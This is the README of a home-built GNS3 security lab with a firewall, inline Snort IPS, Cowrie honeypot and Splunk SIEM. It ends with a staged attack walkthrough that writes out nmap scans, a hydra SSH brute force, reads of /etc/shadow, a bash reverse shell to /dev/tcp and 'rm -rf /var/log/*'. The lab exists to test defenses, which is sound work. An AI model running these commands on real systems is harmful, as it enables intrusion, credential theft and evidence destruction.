# Gate Guardian, GNS3 Network Security Lab

This is a network security lab I built in GNS3. It has different zones, and it shows how layered defense works, a firewall, an intrusion detection system, a honeypot that tricks attackers, and a logging system that saves everything. I also ran a full attack on it to test if the defenses actually work.

## Overview

This lab is a small copy of how an enterprise network can be protected. The idea was not just to read about these things, but to actually build them and attack the network myself, to see if each layer really does its job, detecting the attacker, stopping them, and logging what happened.

**Stack:**
- **OPNsense**, the firewall and gateway
- **Snort**, inline IPS running on a transparent bridge (`br0`)
- **Cowrie**, SSH honeypot
- **Splunk**, SIEM, collects all the logs
- **FreeRADIUS**, AAA server
- **Apache / Postfix**, fake web and mail servers
- **QEMU based Cisco vIOS routers and L3 switches**, used for the core and distribution layers

## What's Inside

| Folder / File       | What It Is                                                                 |
| --------------------- | ----------------------------------------------------------------------------- |
| `assets/`            | The topology diagram and other images used in this README                 |
| `configs/`           | Full running config backups for Router One, Router Two, L3Switch One, L3Switch Two |
| `docs/`              | The three phase write ups and the attack scenario documentation, as PDFs   |
| `project symbols/`   | The custom symbols used to draw the topology in GNS3                       |
| `topology/`          | The GNS3 project file, holds the full topology and all the connections     |
| `.gitignore`         | Keeps VM disk images, logs, and secrets out of the repository              |
| `README.md`          | This file                                                                   |

Note, the actual VM disk images, Cisco device images, and Splunk install files are not included in this repository. Some of that is proprietary software with licensing restrictions, and some of it is just too large for GitHub. The section below walks you through getting everything yourself.

## Requirements

Before starting, make sure you have these installed:

- **GNS3**, local install, no GNS3 VM needed (I used version 2.2.58.1)
- **Oracle VirtualBox** (I used version 7.0)

## Setup

### 1. Get the VMs and Images Yourself

Nothing here is pre packaged, since some of these are licensed products I cannot redistribute. Here is what you need, and where to get it:

- **OPNsense**, free download from opnsense.org, install it as a VM in VirtualBox
- **Kali Linux**, free download from kali.org, used for the attacker machine and the management console
- **Ubuntu Server**, free download from ubuntu.com, this is the base image I cloned for the Web Server, Mail Server, Honeypot, Snort box, and AAA server, then configured each one differently on top of it
- **Snort**, installed on top of an Ubuntu Server VM, source and install instructions at snort.org
- **Cowrie**, open source honeypot, cloned from its GitHub repository and set up as described in `docs/`
- **FreeRADIUS**, installed with `apt install freeradius` on Ubuntu Server
- **Splunk Enterprise**, free trial download from splunk.com, this one is a commercial product, so get it directly from Splunk rather than from any third party copy
- **Cisco vIOS router and switch images**, these are licensed by Cisco. You need your own copy through a legitimate source, such as a Cisco learning lab bundle you already have access to, these cannot legally be shared or redistributed, including on sites like this one

Once you have all of these, build each VM, set its IP address to match the table below, and import it into GNS3 as a node.

Expected devices once everything is built:

| VM / Device       | IP Address         |
| ------------------- | --------------------- |
| OPNsense           | multiple interfaces |
| Web Server          | 192.168.30.10         |
| Mail Server         | 192.168.30.20         |
| Honeypot (Cowrie)   | 192.168.30.30         |
| Snort IPS           | 192.168.30.40         |
| Splunk SIEM         | 192.168.100.10       |
| AAA Server          | 192.168.100.20       |
| Management Node     | 192.168.100.20 (temporary) |
| Attacker Machine    | 10.10.10.2             |

Important, the import order matters once your VMs exist. Three of them, the Kali based attacker VM, the Snort server base image, and the small management browser base image, should be imported into VirtualBox first, since other VMs may be linked base clones of them. If you clone from them later, do not rename or delete these three afterward, a clone is linked to its parent by internal UUID, and renaming the parent breaks the link without any warning.

### 2. Import the GNS3 Appliances

When GNS3 asks about QEMU extra arguments, put this for both the router and the switch templates:

```
-accel tcg,thread=multi
```

This is needed because VirtualBox and QEMU both try to use hardware acceleration on Windows at the same time, and they conflict. This flag tells QEMU to use software emulation instead, and it fixes the problem.

### 3. Open the Topology

In GNS3, go to File, then Open Project, and select the project file inside `topology/`. The whole topology loads with everything already connected.

### 4. Start the Lab, Order Matters

**Start network devices first:**
1. OPNsense (wait about 60 seconds for it to finish booting)
2. Router One and Router Two
3. L3Switch One and L3Switch Two
4. Access layer switch and the other built in GNS3 switches

**Then start the VMs:**
1. Snort (starts first, because all DMZ traffic has to pass through it)
2. Web Server, Mail Server, Honeypot
3. Splunk, AAA Server
4. Management node
5. Attacker machine (last, only needed when running the attack)

### 5. Restore Router and Switch Configs

The `.gns3` file saves the wiring, but the router and switch configs live in NVRAM. If the configs are missing after opening the project:

1. Right click the device, then Console
2. Paste the matching file from `configs/`
3. Run `write memory`

Note, the L3 switch configs need `vtp mode transparent`, without it, the VLANs do not survive a reboot.

### 6. Start Snort

```bash
sudo snort \
  -c /path/to/snort3-master/lua/snort.lua \
  -R /path/to/my_rules.rules \
  -i br0 \
  -A alert_fast \
  > /path/to/my_logs.txt &
```

Check it is running: `ps aux | grep snort`
Watch the alerts live: `tail -f /path/to/my_logs.txt`

Snort runs as an inline IPS on a transparent bridge (`br0`). All DMZ traffic physically passes through it. It is invisible to the attacker, but it can still drop bad packets in real time.

### 7. Start Cowrie

```bash
sudo su - cowrie
cd cowrie
source ../cowrie-env/bin/activate
python3 -m twisted twistd -y cowrie/bin/cowrie.tac
ps aux | grep cowrie
```

Once this is running, any SSH connection to the honeypot's IP on port 22 gets quietly redirected to Cowrie on port 2222. The attacker believes they reached a real server, Cowrie logs everything they type, without actually running any of it.

### 8. Access Splunk

Splunk runs on port 8000, and you reach it through the management node's browser.

Known limitation, the small management VM loses its IP every time it reboots. After each reboot, type these commands again:

```bash
ip link set dev eth0 down
ip addr add 192.168.100.20/24 dev eth0
ip link set dev eth0 up
ip route add default via 192.168.100.1
```

Then open the browser inside that VM and go to `http://<splunk ip>:8000`. This lab runs plain HTTP on port 8000, not HTTPS.

## Running the Attack Simulation

All attacks are run from the attacker machine. This is "Operation Phantom Web", a staged attack meant to test every defense layer, one at a time.

### Phase 1, Reconnaissance
```bash
# Discover live hosts
nmap -sn 192.168.30.0/24

# Stealth SYN scan
sudo nmap -sS -T2 -p 1-1000 192.168.30.0/24

# Service and version detection
nmap -sV -sC -p 22,80,25,443 192.168.30.0/24

# OS fingerprinting
sudo nmap -O --osscan-guess 192.168.30.30

# Banner grab
nc -v 192.168.30.30 22
```

### Phase 2, SSH Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  -t 4 -w 3 -f -V \
  -o /tmp/hydra_results.txt \
  ssh://192.168.30.30
```
Cowrie accepts a weak password on purpose, to pull the attacker in. From here, every command the attacker types gets logged.

### Phase 3, Inside the Honeypot
```bash
ssh root@192.168.30.30
# Everything from here runs inside Cowrie, it is fake, but it is all logged
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
ip route show
arp -a
```

### Phase 4, Lateral Movement (gets blocked)
```bash
ping -c 3 192.168.20.1
ping -c 3 192.168.21.1
ping -c 3 192.168.100.10
ssh root@192.168.20.1
bash -i >& /dev/tcp/10.10.10.2/4444 0>&1
```
All of this is blocked by OPNsense. The DMZ cannot reach the internal VLANs or the management zone.

### Phase 5, Covering Tracks (does nothing)
```bash
history -c
cat /dev/null > ~/.bash_history
rm -rf /var/log/*
```
Everything was already sent to Splunk in real time, so deleting the local logs changes nothing.

## Checking the Attack in Splunk

```spl
index=main | sort _time desc | head 50
```

```spl
index=main
| sort _time
| table _time, sourcetype, source, message
```

```spl
index=main sourcetype=syslog
| stats count by message
| sort - count
```

## Network Reference

| Device            | Interface      | IP Address         | Role               |
| ------------------ | --------------- | -------------------- | -------------------- |
| OPNsense          | WAN             | 10.10.10.1/24        | External gateway    |
| OPNsense          | LAN_R1          | 10.0.0.1/30           | Router One link      |
| OPNsense          | LAN_R2          | 10.0.0.5/30           | Router Two link      |
| OPNsense          | MGMT            | 192.168.100.1/24     | Management zone      |
| OPNsense          | DMZ             | 192.168.30.1/24      | DMZ zone              |
| Router One        | gi0/0           | 10.0.0.2/30           | OPNsense link         |
| Router Two        | gi0/0           | 10.0.0.6/30           | OPNsense link         |
| Web Server         | n/a             | 192.168.30.10/24     | Apache HTTP/HTTPS    |
| Mail Server        | n/a             | 192.168.30.20/24     | Postfix SMTP          |
| Honeypot           | n/a             | 192.168.30.30/24     | Cowrie SSH trap       |
| Snort              | br0             | 192.168.30.40/24     | Inline IPS bridge    |
| Splunk             | n/a             | 192.168.100.10/24    | SIEM, port 8000       |
| AAA Server         | n/a             | 192.168.100.20/24    | FreeRADIUS, port 1812 |
| Attacker Machine   | n/a             | 10.10.10.2/24          | Attack simulation     |
| HR VLAN            | n/a             | 192.168.20.0/24      | Internal users        |
| IT VLAN            | n/a             | 192.168.21.0/24      | Internal users        |
| Finance VLAN       | n/a             | 192.168.22.0/24      | Internal users        |
| Sales VLAN         | n/a             | 192.168.23.0/24      | Internal users        |
| VPN Tunnel         | n/a             | 10.8.0.0/24            | OpenVPN clients       |

## Software and Image Versions

This is what I know for certain, and how to check the rest on your own build, since versions can drift depending on when you download each tool.

| Component          | Version Used                       | How I Know / How To Check It Yourself |
| -------------------- | ------------------------------------- | ---------------------------------------- |
| GNS3                | 2.2.58.1                             | Confirmed, shown in GNS3 under Help, then About |
| Oracle VirtualBox    | 7.0                                  | Confirmed, shown in VirtualBox under Help, then About VirtualBox, gives the exact build number too |
| Splunk Enterprise    | 9.2.1                                | Confirmed, this was the exact version downloaded during setup (`splunk-9.2.1-...-amd64.deb`), also visible once installed, log in and check the bottom of any page, or run `/opt/splunk/bin/splunk version` |
| Kali Linux           | 2026.1                               | Confirmed, this was the base image filename used (`kali-linux-2026.1-virtualbox-amd64`) |
| OPNsense             | 26.1.6_2-amd64 (FreeBSD 14.3-RELEASE-p10, OpenSSL 3.0.20) | Confirmed, shown on the Dashboard (Lobby) page right under "Versions" |
| Snort                | 3.12.2.0                             | Confirmed, run `snort -V` on the Snort VM |
| Cowrie               | Git commit `c7773f4`, dated October 15, 2026 | Confirmed, no `VERSION` file exists in this build, so the exact commit is the most precise identifier. Check it yourself with `git log -1` inside the cowrie folder |
| FreeRADIUS           | 3.2.7                                | Confirmed, run `freeradius -v` on the AAA server |
| Ubuntu Server (base image for Web, Mail, Honeypot, Snort, AAA) | 25.10, kernel 6.17.0-23-generic | Confirmed, shown right in the login banner of every Ubuntu based VM, no command needed, it is printed every time you log in |
| Cisco vIOS, Router One, Router Two, L3Switch One, L3Switch Two | IOSv Software (VIOS-ADVENTERPRISEK9-M), Version 15.6(2)T, RELEASE SOFTWARE (fc2) | Confirmed, same version on all four devices, run `show version` on any device console |
| Apache (Web Server)  | 2.4.64 (Ubuntu)                      | Confirmed, run `apache2 -v` |
| Postfix (Mail Server) | 3.10.2                              | Confirmed, run `postconf mail_version` |

Everything above is now confirmed.

## Notes and Known Limitations

- Credentials are not included in this repository. In the original lab, all the VMs and services shared one username and password, just to keep things simple while building and testing. This is a real security problem if it ever got close to production, so if you rebuild this lab, give every device its own login, and never put real credentials in version control (see the `.gitignore` below).
- The management node does not keep its IP after a reboot. This comes from the small OS it runs on. Run the IP commands in Step 8 again after every restart.
- GNS3 takes control of the VM's network adapter. Once a VM is part of the topology, its VirtualBox adapter shows as "Generic". This is normal.
- The QEMU acceleration flag is required. If the routers or switches fail to start, check that `-accel tcg,thread=multi` is set, otherwise QEMU and VirtualBox fight over hardware acceleration on Windows.
- FreeRADIUS is running, but it is not connected to any device yet, that is planned as a next step.
- Primary and secondary gateway redundancy was removed during a troubleshooting session (a VLAN persistence problem forced a config rebuild), and it has not been added back yet. Re adding the floating static routes between both routers and OPNsense is the main thing left to improve.

## What This Shows

- A firewall that checks every packet going in or out of the network
- An inline IPS that watches the traffic quietly, without the attacker noticing it
- A honeypot that convincingly traps an attacker instead of letting them reach anything real
- Centralized, real time logging that survives even when the attacker tries to delete the evidence
- Firewall rules that enforce zero trust between zones, so even a compromised DMZ host cannot reach the internal network

Everything in this lab was built, broken, and fixed by hand, this repo is basically the record of that whole process.
